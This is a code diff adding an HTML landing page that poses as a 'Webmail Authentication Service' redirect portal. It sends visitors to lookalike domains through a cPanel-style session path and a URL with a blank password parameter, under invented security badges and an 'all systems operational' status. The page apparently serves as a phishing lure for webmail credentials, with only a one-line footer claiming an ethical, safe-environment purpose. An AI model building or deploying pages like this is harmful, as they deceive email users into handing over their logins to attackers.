@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webmail Authentication Service - Secure Redirect Portal</title>
+    <meta name="description" content="Secure webmail authentication redirect service for professional email management">
+    <meta name="keywords" content="webmail, authentication, redirect, email, security">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>">
+    
+    <!-- External CSS -->
+    <link rel="stylesheet" href="styles.css">
+    
+    <!-- CSS Styles -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            padding: 3rem;
+            max-width: 800px;
+            width: 90%;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .logo {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 1rem;
+            font-size: 2.5rem;
+            font-weight: 700;
+        }
+
+        .subtitle {
+            color: #7f8c8d;
+            font-size: 1.2rem;
+            margin-bottom: 2rem;
+        }
+
+        .status-card {
+            background: linear-gradient(135deg, #74b9ff 0%, #0984e3 100%);
+            color: white;
+            padding: 2rem;
+            border-radius: 15px;
+            margin: 2rem 0;
+            box-shadow: 0 10px 20px rgba(116, 185, 255, 0.3);
+        }
+
+        .status-indicator {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            background: #00b894;
+            border-radius: 50%;
+            margin-right: 10px;
+            animation: blink 2s infinite;
+        }
+
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.5; }
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+
+        .feature {
+            background: #f8f9fa;
+            padding: 1.5rem;
+            border-radius: 10px;
+            border-left: 4px solid #667eea;
+            text-align: left;
+        }
+
+        .feature h3 {
+            color: #2c3e50;
+            margin-bottom: 0.5rem;
+        }
+
+        .feature p {
+            color: #7f8c8d;
+            font-size: 0.9rem;
+        }
+
+        .btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 12px 30px;
+            text-decoration: none;
+            border-radius: 25px;
+            font-weight: 600;
+            margin: 0.5rem;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.6);
+        }
+
+        .btn-secondary {
+            background: linear-gradient(135deg, #74b9ff 0%, #0984e3 100%);
+            box-shadow: 0 5px 15px rgba(116, 185, 255, 0.4);
+        }
+
+        .btn-secondary:hover {
+            box-shadow: 0 8px 25px rgba(116, 185, 255, 0.6);
+        }
+
+        .footer {
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 1px solid #ecf0f1;
+            color: #7f8c8d;
+            font-size: 0.9rem;
+        }
+
+        .domain-info {
+            background: #ecf0f1;
+            padding: 1rem;
+            border-radius: 10px;
+            margin: 1rem 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+
+        .security-badge {
+            display: inline-block;
+            background: #00b894;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin: 0.5rem;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 2rem;
+                margin: 1rem;
+            }
+
+            h1 {
+                font-size: 2rem;
+            }
+
+            .features {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .loading {
+            display: none;
+            margin: 1rem 0;
+        }
+
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🔐</div>
+        <h1>Webmail Authentication Service</h1>
+        <p class="subtitle">Secure Redirect Portal for Professional Email Management</p>
+        
+        <div class="status-card">
+            <span class="status-indicator"></span>
+            <strong>Service Status: Active</strong>
+            <p style="margin-top: 0.5rem; opacity: 0.9;">All systems operational</p>
+        </div>
+
+        <div class="domain-info">
+            <strong>Source Domain:</strong> webmail-auth001.ibeddcoutsource.org<br>
+            <strong>Target Domain:</strong> webmail-auth001.molecullesoft.com<br>
+            <strong>Encryption Path:</strong> /cpsess/prompt
+        </div>
+
+        <div class="features">
+            <div class="feature">
+                <h3>🔒 Secure Redirect</h3>
+                <p>All traffic is encrypted with SSL/TLS and automatically redirected to the secure target domain.</p>
+            </div>
+            <div class="feature">
+                <h3>🔄 Parameter Preservation</h3>
+                <p>Encryption parameters and authentication tokens are preserved during the redirect process.</p>
+            </div>
+            <div class="feature">
+                <h3>📊 Real-time Monitoring</h3>
+                <p>24/7 service monitoring with detailed logging and health checks for optimal performance.</p>
+            </div>
+        </div>
+
+        <div class="security-badge">SSL/TLS Encrypted</div>
+        <div class="security-badge">HTTPS Only</div>
+        <div class="security-badge">Security Headers</div>
+
+        <div style="margin: 2rem 0;">
+            <a href="https://webmail-auth001.ibeddcoutsource.org/cpsess/prompt" class="btn" onclick="showLoading()">
+                Access Webmail Portal
+            </a>
+            <a href="#" class="btn btn-secondary" onclick="testRedirect()">
+                Test Redirect
+            </a>
+        </div>
+
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Testing redirect functionality...</p>
+        </div>
+
+        <div class="footer">
+            <p>© 2024 Webmail Authentication Service. Designed for ethical purposes in a safe environment.</p>
+            <p>For support or questions, please contact your system administrator.</p>
+        </div>
+    </div>
+
+    <script>
+        function showLoading() {
+            document.getElementById('loading').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+            }, 3000);
+        }
+
+        function testRedirect() {
+            const testUrl = 'https://webmail-auth001.ibeddcoutsource.org/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=';
+            
+            document.getElementById('loading').style.display = 'block';
+            
+            // Simulate redirect test
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                alert('Redirect test completed! Check the browser network tab for details.');
+            }, 2000);
+        }
+
+        // Add some interactive effects
+        document.addEventListener('DOMContentLoaded', function() {
+            // Animate features on scroll
+            const features = document.querySelectorAll('.feature');
+            features.forEach((feature, index) => {
+                feature.style.opacity = '0';
+                feature.style.transform = 'translateY(20px)';
+                
+                setTimeout(() => {
+                    feature.style.transition = 'all 0.6s ease';
+                    feature.style.opacity = '1';
+                    feature.style.transform = 'translateY(0)';
+                }, index * 200);
+            });
+
+            // Add click effect to buttons
+            const buttons = document.querySelectorAll('.btn');
+            buttons.forEach(button => {
+                button.addEventListener('click', function(e) {
+                    const ripple = document.createElement('span');
+                    const rect = this.getBoundingClientRect();
+                    const size = Math.max(rect.width, rect.height);
+                    const x = e.clientX - rect.left - size / 2;
+                    const y = e.clientY - rect.top - size / 2;
+                    
+                    ripple.style.width = ripple.style.height = size + 'px';
+                    ripple.style.left = x + 'px';
+                    ripple.style.top = y + 'px';
+                    ripple.classList.add('ripple');
+                    
+                    this.appendChild(ripple);
+                    
+                    setTimeout(() => {
+                        ripple.remove();
+                    }, 600);
+                });
+            });
+        });
+
+        // Add ripple effect CSS
+        const style = document.createElement('style');
+        style.textContent = `
+            .btn {
+                position: relative;
+                overflow: hidden;
+            }
+            
+            .ripple {
+                position: absolute;
+                border-radius: 50%;
+                background: rgba(255, 255, 255, 0.3);
+                transform: scale(0);
+                animation: ripple-animation 0.6s linear;
+                pointer-events: none;
+            }
+            
+            @keyframes ripple-animation {
+                to {
+                    transform: scale(4);
+                    opacity: 0;
+                }
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+    
+    <!-- External JavaScript -->
+    <script src="script.js"></script>
+</body>
+</html>
